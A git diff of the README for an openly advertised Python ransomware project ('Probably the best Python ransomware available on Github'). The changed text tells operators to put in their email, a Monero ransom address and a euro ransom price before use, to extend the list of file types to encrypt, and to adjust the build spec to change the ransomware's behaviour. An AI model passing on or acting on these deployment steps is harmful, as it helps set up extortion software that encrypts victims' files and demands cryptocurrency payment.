@@ -81,7 +81,7 @@ Probably the best Python ransomware available on Github
 - Go to ``C:\Users\user\AppData\Local`` and delete ``IconCache.db``
 
 ## DONT FORGET 
-- In production edit the ``EMAIL`` and ``MONERO_ADDRESS`` in ``const.py``.
+- In production edit the ``EMAIL``,``MONERO_ADDRESS`` and ``PRICE_MONERO_EUR`` in ``const.py``.
 - Add some files extensions on ``encryption/encrypt.py`` line 26.
 - You can modify the ``build.spec`` if you want change the behaviour of the ransomware
 
